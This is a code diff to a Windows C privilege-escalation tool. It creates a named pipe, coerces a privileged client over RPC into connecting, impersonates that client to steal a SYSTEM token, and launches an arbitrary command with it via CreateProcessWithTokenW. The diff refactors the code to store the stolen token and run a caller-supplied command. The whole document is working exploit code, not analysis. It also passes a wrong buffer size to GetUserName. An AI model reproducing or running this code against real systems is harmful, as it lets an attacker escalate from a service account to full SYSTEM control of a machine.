@@ -4,18 +4,21 @@
 extern LPWSTR g_pwszCommandLine;
 extern HANDLE hSystemToken;
 
+
 void GetSystemAsImpersonatedUser(HANDLE hToken)
 {
 	DWORD dwCreationFlags = 0;
 	PROCESS_INFORMATION pi = { 0 };
 	STARTUPINFO si = { 0 };
 	LPWSTR pwszCurrentDirectory = NULL;
-
+	
 	LPVOID lpEnvironment = NULL;
 	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
 	
 	// WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
 	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
+	
+
 	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
 	{
 		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
@@ -30,9 +33,10 @@ void GetSystemAsImpersonatedUser(HANDLE hToken)
 
 	ZeroMemory(&si, sizeof(STARTUPINFO));
 	
+	
 	si.cb = sizeof(STARTUPINFO);
 	si.lpDesktop = (LPWSTR)L"WinSta0\\default";
-
+	
 	if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
 	{
 		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
@@ -44,12 +48,7 @@ void GetSystemAsImpersonatedUser(HANDLE hToken)
 		return;
 	}
 
-	
-	/*AccessToken.Token = hSystemTokenDup;
-	AccessToken.Thread = GetCurrentThread();
-	NtSetInformationProcess(GetCurrentProcess(),ProcessAccessToken,&AccessToken,sizeof(AccessToken));
 
-	//WinExec("calc.exe", FALSE);*/
 
 cleanup:
 	if (hToken)
@@ -95,15 +94,17 @@ void StartNamedPipeAndGetSystem()
 		if (ConnectNamedPipe(hPipe, NULL) > 0) {
 			wprintf(L"[+] A client connected!\n");
 			if (ImpersonateNamedPipeClient(hPipe)) {
-				if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
-					
-					GetSystemAsImpersonatedUser(hToken);
+				WCHAR szUser[256];
+				DWORD dwSize = 265;
+				GetUserName(szUser, &dwSize);
+				wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
+
+				if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken)) {
 					CloseHandle(hPipe);
-					
 				}
 			}
 			else {
-				printf("CreateNamedPipe error\n");
+				wprintf(L"[-] CreateNamedPipe error\n");
 				CloseHandle(hPipe);
 				return;
 			}
@@ -112,11 +113,13 @@ void StartNamedPipeAndGetSystem()
 	}
 }
 
-void ConnectEvilPipe()
+void ExecuteCommand(PWCHAR Command)
 {
 	RPC_STATUS status;
 	RPC_WSTR pszStringBinding;
 	RPC_BINDING_HANDLE BindingHandle;
+
+	g_pwszCommandLine = Command;
 
 	status = RpcStringBindingCompose(
 		NULL,
@@ -159,14 +162,13 @@ void ConnectEvilPipe()
 	{
 		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
 	}RpcEndExcept
-
+	Sleep(1000);
+	GetSystemAsImpersonatedUser(hSystemToken);
 }
 
 
-void Service2System(PWCHAR Command) {
-	g_pwszCommandLine = Command;
+void Service2System() {
 	DWORD dwThread = 0;
 	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)StartNamedPipeAndGetSystem, NULL, NULL, &dwThread);
 	Sleep(1000);
-	ConnectEvilPipe();
 }
